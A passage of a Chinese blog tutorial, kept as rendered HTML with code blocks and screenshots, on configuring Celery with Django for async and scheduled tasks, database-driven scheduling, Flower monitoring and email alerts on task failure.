设置系统环境变量，否则在启动celery时会报错</span></span><br><span class="line"><span class="comment"># taskproject 是当前项目名</span></span><br><span class="line">os.environ.setdefault(<span class="string">'DJANGO_SETTINGS_MODULE'</span>, <span class="string">'taskproject.settings'</span>)</span><br><span class="line">django.setup()</span><br><span class="line"></span><br><span class="line">celery_app = Celery(<span class="string">'taskproject'</span>)</span><br><span class="line">celery_app.config_from_object(<span class="string">'django.conf:settings'</span>)</span><br><span class="line">celery_app.autodiscover_tasks(<span class="keyword">lambda</span>: settings.INSTALLED_APPS)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230112/1_%E5%BC%95%E5%85%A5celery.png" alt="在这里插入图片描述"></p><p>在主目录的<strong>init</strong>.py中添加如下代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> .celery <span class="keyword">import</span> celery_app</span><br><span class="line"></span><br><span class="line">__all__ = [<span class="string">'celery_app'</span>]</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230112/2___init__py%E6%B7%BB%E5%8A%A0%E4%BB%A3%E7%A0%81.png" alt="在这里插入图片描述"></p><h3 id="3、在settings-py中设置celery的相关参数"><a href="#3、在settings-py中设置celery的相关参数" class="headerlink" title="3、在settings.py中设置celery的相关参数"></a>3、在settings.py中设置celery的相关参数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">###----Celery redis 配置-----###</span></span><br><span class="line"><span class="comment"># Broker配置，使用Redis作为消息中间件</span></span><br><span class="line">BROKER_URL = <span class="string">'redis://:redispassword@127.0.0.1:6379/0'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># BACKEND配置，使用redis</span></span><br><span class="line">CELERY_RESULT_BACKEND = <span class="string">'redis://:redispassword@127.0.0.1:6379/1'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CELERY_ACCEPT_CONTENT=[<span class="string">'json'</span>]</span><br><span class="line">CELERY_TASK_SERIALIZER=<span class="string">'json'</span></span><br><span class="line"><span class="comment"># 结果序列化方案</span></span><br><span class="line">CELERY_RESULT_SERIALIZER = <span class="string">'json'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 任务结果过期时间，秒</span></span><br><span class="line">CELERY_TASK_RESULT_EXPIRES = <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 时区配置</span></span><br><span class="line">CELERY_TIMEZONE = <span class="string">'Asia/Shanghai'</span></span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230112/3_setting%E4%B8%AD%E8%AE%BE%E7%BD%AEcelery%E7%9A%84%E7%9B%B8%E5%85%B3%E5%8F%82%E6%95%B0.png" alt="在这里插入图片描述"></p><p>这时候Celery的基本配置完成了，可以实现并添加任务了。</p><h2 id="二、实现异步任务"><a href="#二、实现异步任务" class="headerlink" title="二、实现异步任务"></a>二、实现异步任务</h2><h3 id="1、创建tasks-py"><a href="#1、创建tasks-py" class="headerlink" title="1、创建tasks.py"></a>1、创建tasks.py</h3><p>在子应用下建立各自对应的任务文件tasks.py(<code>必须是tasks.py这个名字，不允许修改</code>)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> celery <span class="keyword">import</span> shared_task</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logger = logging.getLogger(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@shared_task()</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">task1</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(int(x)):</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line">        logger.info(<span class="string">'this is task1 '</span>+str(i))</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@shared_task</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scheduletask1</span><span class="params">()</span>:</span></span><br><span class="line">    now = datetime.datetime.now()</span><br><span class="line">    logger.info(<span class="string">'this is scheduletask '</span>+now.strftime(<span class="string">"%Y-%m-%d %H:%M:%S"</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure><p>在tasks.py中我们定义了两个任务，这两个任务要用@shared_task装饰起来，否则celery无法管理。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230112/4_@shared_task.png" alt="在这里插入图片描述"></p><p>为了放便执行我们通过views把这两个任务通过函数方法调用起来，用URL进行发布。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">views.py</span><br><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> JsonResponse</span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> tasks</span><br><span class="line"><span class="comment"># Create your views here.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runtask</span><span class="params">(request)</span>:</span></span><br><span class="line">    x=request.GET.get(<span class="string">'x'</span>)</span><br><span class="line">    tasks.task1.delay(x)</span><br><span class="line">    content= &#123;<span class="string">'200'</span>: <span class="string">'run task1 success!---'</span>+str(x)&#125;</span><br><span class="line">    <span class="keyword">return</span> JsonResponse(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runscheduletask</span><span class="params">(request)</span>:</span></span><br><span class="line">    tasks.scheduletask1.delay()</span><br><span class="line">    content= &#123;<span class="string">'200'</span>: <span class="string">'success！'</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> JsonResponse(content)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230112/5_views%E5%8F%91%E5%B8%83%E4%BB%BB%E5%8A%A1.png" alt="在这里插入图片描述"></p><p>在urls中加入路由进行发布</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> taskapp <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'task'</span>, views.runtask),</span><br><span class="line">    path(<span class="string">'runscheduletask'</span>, views.runscheduletask),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230112/6_urls%E5%8A%A0%E5%85%A5%E8%B7%AF%E7%94%B1%E8%BF%9B%E8%A1%8C%E5%8F%91%E5%B8%83.png" alt="在这里插入图片描述"></p><p>在项目的主urls中加入子项目的urls<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/images/2023/20230112/7_%E4%B8%BBurls%E4%B8%AD%E5%8A%A0%E5%85%A5%E5%AD%90%E9%A1%B9%E7%9B%AE%E7%9A%84urls.png" alt="在这里插入图片描述"></p><h3 id="2、启动celery"><a href="#2、启动celery" class="headerlink" title="2、启动celery"></a>2、启动celery</h3><blockquote><p>在启动celery之前，先要启动redis服务，因为celery在settings中配置要用到redis作为消息中间件和结果存储。<br>windows环境下启动redis的命令为redis-server.exe redis.windows.conf</p></blockquote><p>在控制台启动celery的worker</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">celery -A taskproject worker -l debug -P eventlet</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230112/8_%E5%90%AF%E5%8A%A8celery.png" alt="在这里插入图片描述"></p><p>启动django访问url调用任务，看异步效果<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230112/9.%E6%9F%A5%E7%9C%8B%E5%BC%82%E6%AD%A5%E6%95%88%E6%9E%9C.png" alt="在这里插入图片描述"></p><h3 id="3、查看任务"><a href="#3、查看任务" class="headerlink" title="3、查看任务"></a>3、查看任务</h3><p>控制台查看异步任务执行的情况，可以看web的url很快返回响应结果，后台控制台一直在执行异步任务。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230112/10_%E6%9F%A5%E7%9C%8B%E4%BB%BB%E5%8A%A1.png" alt="在这里插入图片描述"></p><h2 id="三、实现定时任务"><a href="#三、实现定时任务" class="headerlink" title="三、实现定时任务"></a>三、实现定时任务</h2><p>Celery实现定时任务也很方便</p><h3 id="1、定义调度器"><a href="#1、定义调度器" class="headerlink" title="1、定义调度器"></a>1、定义调度器</h3><p>在settings.py中加入定时任务的定义就可以实现定时任务</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> celery.schedules <span class="keyword">import</span> crontab</span><br><span class="line"></span><br><span class="line">CELERYBEAT_SCHEDULE = &#123;</span><br><span class="line">    <span class="string">'every_5_seconds'</span>: &#123;</span><br><span class="line">        <span class="comment"># 任务路径</span></span><br><span class="line">        <span class="string">'task'</span>: <span class="string">'taskapp.tasks.scheduletask1'</span>,</span><br><span class="line">        <span class="comment"># 每5秒执行一次</span></span><br><span class="line">        <span class="string">'schedule'</span>: <span class="number">5</span>,</span><br><span class="line">        <span class="string">'args'</span>: ()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里这个scheduletask1是前面tasks.py中定义的任务，当然也可以定义多个定时任务，如加一个task1，task1是有参数的，可以在’args’: ()中传入参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">CELERYBEAT_SCHEDULE = &#123;</span><br><span class="line">    <span class="string">'every_5_seconds'</span>: &#123;</span><br><span class="line">        <span class="comment"># 任务路径</span></span><br><span class="line">        <span class="string">'task'</span>: <span class="string">'taskapp.tasks.scheduletask1'</span>,</span><br><span class="line">        <span class="comment"># 每5秒执行一次</span></span><br><span class="line">        <span class="string">'schedule'</span>: <span class="number">5</span>,</span><br><span class="line">        <span class="string">'args'</span>: ()</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">'every_10_seconds'</span>: &#123;</span><br><span class="line">        <span class="comment"># 任务路径</span></span><br><span class="line">        <span class="string">'task'</span>: <span class="string">'taskapp.tasks.task1'</span>,</span><br><span class="line">        <span class="comment"># 每10秒执行一次,task1的参数是5</span></span><br><span class="line">        <span class="string">'schedule'</span>: <span class="number">10</span>,</span><br><span class="line">        <span class="string">'args'</span>: ([<span class="number">5</span>])</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230112/11_%E5%B8%A6%E5%8F%82%E6%95%B0%E7%9A%84%E4%BB%BB%E5%8A%A1.png" alt="在这里插入图片描述"></p><p>这里定义了task1是10秒执行一次，传入的参数是5。</p><h3 id="2、启动beat"><a href="#2、启动beat" class="headerlink" title="2、启动beat"></a>2、启动beat</h3><p>需要保持worker进程，另外开一个控制台启动beat</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">celery -A taskproject beat -l debug</span><br></pre></td></tr></table></figure><h3 id="3、查看任务-1"><a href="#3、查看任务-1" class="headerlink" title="3、查看任务"></a>3、查看任务</h3><p>启动任务后看控制台打印的日志task1和scheduletask1都按计划定时执行了。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230112/12_%E6%9F%A5%E7%9C%8Btask%E5%92%8Cscheduletask.png" alt="在这里插入图片描述"></p><h2 id="三、通过数据库配置定时任务"><a href="#三、通过数据库配置定时任务" class="headerlink" title="三、通过数据库配置定时任务"></a>三、通过数据库配置定时任务</h2><p>虽然通过settings.py的配置可以实现定时任务的配置，做为实际项目中可能还是不够实用，更加工程化的做法是将定时任务的配置放到数据库里通过界面来配置。同样Celery对此也提供了很好的支持，这需要安装django-celery-beat插件。以下将介绍使用过程。</p><h3 id="1、安装djiango-celery-beat"><a href="#1、安装djiango-celery-beat" class="headerlink" title="1、安装djiango-celery-beat"></a>1、安装djiango-celery-beat</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install django-celery-beat</span><br></pre></td></tr></table></figure><h3 id="2、在APP中注册djiango-celery-beat"><a href="#2、在APP中注册djiango-celery-beat" class="headerlink" title="2、在APP中注册djiango-celery-beat"></a>2、在APP中注册djiango-celery-beat</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">INSTALLED_APPS = [</span><br><span class="line">....</span><br><span class="line"><span class="string">'django_celery_beat'</span>,</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="3、在settings-py中设置调度器及时区"><a href="#3、在settings-py中设置调度器及时区" class="headerlink" title="3、在settings.py中设置调度器及时区"></a>3、在settings.py中设置调度器及时区</h3><p>在settings.py中屏蔽到原来的调度器，加入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CELERYBEAT_SCHEDULER = <span class="string">'django_celery_beat.schedulers.DatabaseScheduler'</span></span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230112/13_settings%E8%AE%BE%E7%BD%AE%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE.png" alt="在这里插入图片描述"></p><p>在setings.py中设置好语言、时区等</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">LANGUAGE_CODE = <span class="string">'zh-hans'</span></span><br><span class="line"></span><br><span class="line">TIME_ZONE = <span class="string">'Asia/Shanghai'</span></span><br><span class="line"></span><br><span class="line">USE_I18N = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">USE_TZ = <span class="literal">False</span></span><br></pre></td></tr></table></figure><h3 id="4、进行数据库迁移"><a href="#4、进行数据库迁移" class="headerlink" title="4、进行数据库迁移"></a>4、进行数据库迁移</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python manage.py migrate django_celery_beat</span><br></pre></td></tr></table></figure><h3 id="5、分别启动woker和beta"><a href="#5、分别启动woker和beta" class="headerlink" title="5、分别启动woker和beta"></a>5、分别启动woker和beta</h3><p>在两个控制台分别启动woker和beta</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">celery -A taskproject worker -l debug -P eventlet</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">celery -A taskproject beat -l debug</span><br></pre></td></tr></table></figure><h3 id="6、启动django服务，访问admin的web管理端"><a href="#6、启动django服务，访问admin的web管理端" class="headerlink" title="6、启动django服务，访问admin的web管理端"></a>6、启动django服务，访问admin的web管理端</h3><p>访问 <a href="http://localhost:8000/admin/" target="_blank" rel="noopener">http://localhost:8000/admin/</a> 可以看到周期任务的管理菜单，管理定时任务非常方便。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230112/14_Django%E7%AE%A1%E7%90%86web%E7%AB%AF.png" alt="在这里插入图片描述"></p><h3 id="7、配置定时任务"><a href="#7、配置定时任务" class="headerlink" title="7、配置定时任务"></a>7、配置定时任务</h3><p>点击“间隔”<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230112/15_%E9%85%8D%E7%BD%AE%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E7%82%B9%E5%87%BB%E9%97%B4%E9%9A%94.png" alt="在这里插入图片描述"></p><p>点击“增加间隔”来增加定时任务的配置，增加一个5秒执行一次的定时器。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230112/16_%E7%82%B9%E5%87%BB%E5%A2%9E%E5%8A%A0%E9%97%B4%E9%9A%94.png" alt="在这里插入图片描述"></p><p>看到有个每5秒的定时器<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230112/17_%E6%AF%8F5%E7%A7%92%E7%9A%84%E5%AE%9A%E6%97%B6%E5%99%A8.png" alt="在这里插入图片描述"></p><p>这时可以用这个定时器去新建调度任务了。选择周期性任务，点击“增加周期性任务”<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230112/18_%E5%A2%9E%E5%8A%A0%E5%91%A8%E6%9C%9F%E6%80%A7%E4%BB%BB%E5%8A%A1.png" alt="在这里插入图片描述"></p><p>填入任务名，选择需要定时执行的任务<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230112/19_%E5%A2%9E%E5%8A%A0%E5%91%A8%E6%9C%9F%E6%80%A7%E4%BB%BB%E5%8A%A1%E7%95%8C%E9%9D%A2.png" alt="在这里插入图片描述"></p><p>因为task1需要参数，在后面参数设置中进行参数的设置。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230112/20_%E5%91%A8%E6%9C%9F%E6%80%A7%E4%BB%BB%E5%8A%A1%E5%8F%82%E6%95%B0%E8%AE%BE%E7%BD%AE.png" alt="在这里插入图片描述"></p><p>保存后可以看到新加了一条“每5秒执行一次task1”的调度任务。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230112/21_%E6%88%90%E5%8A%9F%E6%B7%BB%E5%8A%A0%E6%AF%8F5%E7%A7%92%E6%89%A7%E8%A1%8C%E4%B8%80%E6%AC%A1task1.png" alt="在这里插入图片描述"></p><h3 id="8、查看调度效果"><a href="#8、查看调度效果" class="headerlink" title="8、查看调度效果"></a>8、查看调度效果</h3><p>在woker和beta的控制台都可以看到有定时任务执行的信息，说明任务被成功调度执行了。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230112/22_%E6%9F%A5%E7%9C%8B%E8%B0%83%E5%BA%A6%E6%95%88%E6%9E%9C.png" alt="在这里插入图片描述"></p><h2 id="四、通过django的web界面监控任务执行情况"><a href="#四、通过django的web界面监控任务执行情况" class="headerlink" title="四、通过django的web界面监控任务执行情况"></a>四、通过django的web界面监控任务执行情况</h2><p>在控制台监控任务执行情况，还不是很方便，最好是能够通过web界面看到任务的执行情况，如有多少任务在执行，有多少任务执行失败了等。这个Celery也是可以做到了，就是将任务执行结果写到数据库中，通过web界面显示出来。这里要用到django-celery-results插件。通过插件可以使用Django的orm作为结果存储，这样的好处在于我们可以直接通过django的数据查看到任务状态，同时为可以制定更多的操作，下面介绍如何使用orm作为结果存储。</p><h3 id="1、安装django-celery-results"><a href="#1、安装django-celery-results" class="headerlink" title="1、安装django-celery-results"></a>1、安装django-celery-results</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install django-celery-results</span><br></pre></td></tr></table></figure><h3 id="2、配置settings-py，注册app"><a href="#2、配置settings-py，注册app" class="headerlink" title="2、配置settings.py，注册app"></a>2、配置settings.py，注册app</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">INSTALLED_APPS = (</span><br><span class="line">...,</span><br><span class="line"><span class="string">'django_celery_results'</span>,</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="3、修改backend配置，将Redis改为django-db"><a href="#3、修改backend配置，将Redis改为django-db" class="headerlink" title="3、修改backend配置，将Redis改为django-db"></a>3、修改backend配置，将Redis改为django-db</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># BACKEND配置，使用redis</span></span><br><span class="line"><span class="comment">#CELERY_RESULT_BACKEND = 'redis://:12345678@127.0.0.1:6379/1'</span></span><br><span class="line"><span class="comment"># 使用使用django orm 作为结果存储</span></span><br><span class="line">CELERY_RESULT_BACKEND = <span class="string">'django-db'</span>  <span class="comment">#使用django orm 作为结果存储</span></span><br></pre></td></tr></table></figure><h3 id="4、迁移数据库"><a href="#4、迁移数据库" class="headerlink" title="4、迁移数据库"></a>4、迁移数据库</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python manage.py migrate django_celery_results</span><br></pre></td></tr></table></figure><p>可以看到创建了django_celery_results相关的表<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230112/23_%E8%BF%81%E7%A7%BB%E6%95%B0%E6%8D%AE%E5%BA%93.png" alt="在这里插入图片描述"></p><h3 id="5、查看任务"><a href="#5、查看任务" class="headerlink" title="5、查看任务"></a>5、查看任务</h3><p>启动django服务后，执行异步和定时任务，就可以在管理界面看到任务的执行情况，执行了哪些任务，哪些任务执行失败了等。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230112/24_web%E7%95%8C%E9%9D%A2%E6%9F%A5%E7%9C%8B%E4%BB%BB%E5%8A%A1.png" alt="在这里插入图片描述"></p><h2 id="五、通过Flower监控任务执行情况"><a href="#五、通过Flower监控任务执行情况" class="headerlink" title="五、通过Flower监控任务执行情况"></a>五、通过Flower监控任务执行情况</h2><p>如果不想通django的管理界面监控任务的执行，还可以通过Flower插件来进行任务的监控。FLower的界面更加丰富，可以监控的信息更全。以下介绍通过Flower来进行任务监控。</p><h3 id="1、安装flower"><a href="#1、安装flower" class="headerlink" title="1、安装flower"></a>1、安装flower</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install flower</span><br></pre></td></tr></table></figure><h3 id="2、启动flower"><a href="#2、启动flower" class="headerlink" title="2、启动flower"></a>2、启动flower</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">celery -A taskproject flower --port<span class="number">-5566</span></span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230112/25_%E5%90%AF%E5%8A%A8flower.png" alt="在这里插入图片描述"></p><h3 id="3、使用flower进行任务监控"><a href="#3、使用flower进行任务监控" class="headerlink" title="3、使用flower进行任务监控"></a>3、使用flower进行任务监控</h3><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230112/26_%E4%BD%BF%E7%94%A8flower%E8%BF%9B%E8%A1%8C%E4%BB%BB%E5%8A%A1%E7%9B%91%E6%8E%A7.png" alt="在这里插入图片描述"></p><p>点击失败的我们可以看到执行失败的详情，这里是故意给task1的参数传了个‘a’字符，导致它执行报错了。可以看到任务执行的报错信息也展示出来了。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230112/27_flower%E7%BB%93%E6%9E%9C.png" alt="在这里插入图片描述"></p><h2 id="六、实现任务异常自动邮件告警"><a href="#六、实现任务异常自动邮件告警" class="headerlink" title="六、实现任务异常自动邮件告警"></a>六、实现任务异常自动邮件告警</h2><p>虽然可以通过界面来监控了，但是我们想要得更多，人不可能天天盯着界面看吧，如果能实现任务执行失败就自动发邮件告警就好了。这个Celery当然也是没有问题的。<br>通过钩子程序在异常的时候触发邮件通知。</p><h3 id="1、加入钩子程序"><a href="#1、加入钩子程序" class="headerlink" title="1、加入钩子程序"></a>1、加入钩子程序</h3><p>对tasks.py的改造如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> celery <span class="keyword">import</span> shared_task</span><br><span class="line"><span class="keyword">from</span> celery <span class="keyword">import</span> Task</span><br><span class="line"><span class="keyword">from</span> django.core.mail <span class="keyword">import</span> send_mail</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logger = logging.getLogger(__name__)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyHookTask</span><span class="params">(Task)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">on_success</span><span class="params">(self, retval, task_id, args, kwargs)</span>:</span></span><br><span class="line">        info=<span class="string">f'任务成功-- 0task id:<span class="subst">&#123;task_id&#125;</span> , arg:<span class="subst">&#123;args&#125;</span> , successful !'</span></span><br><span class="line">        logger.info(info)</span><br><span class="line">        send_mail(<span class="string">'celery任务监控'</span>, info, <span class="string">'sendmail@qq.com'</span>, [<span class="string">'tomail@qq.com'</span>])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">on_failure</span><span class="params">(self, exc, task_id, args, kwargs, einfo)</span>:</span></span><br><span class="line">        info=<span class="string">f'任务失败-- task id:<span class="subst">&#123;task_id&#125;</span> , arg:<span class="subst">&#123;args&#125;</span> , failed ! erros: <span class="subst">&#123;exc&#125;</span>'</span></span><br><span class="line">        logger.info(info)</span><br><span class="line">        send_mail(<span class="string">'celery任务监控异常'</span>, info, <span class="string">'sendmail@qq.com'</span>, [<span class="string">'tomail@qq.com'</span>])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">on_retry</span><span class="params">(self, exc, task_id, args, kwargs, einfo)</span>:</span></span><br><span class="line">        logger.info(<span class="string">f'task id:<span class="subst">&#123;task_id&#125;</span> , arg:<span class="subst">&#123;args&#125;</span> , retry !  erros: <span class="subst">&#123;exc&#125;</span>'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@shared_task(base=MyHookTask, bind=True)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">task1</span><span class="params">(self,x)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(int(x)):</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line">        logger.info(<span class="string">'this is task1 '</span>+str(i))</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@shared_task</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scheduletask1</span><span class="params">()</span>:</span></span><br><span class="line">    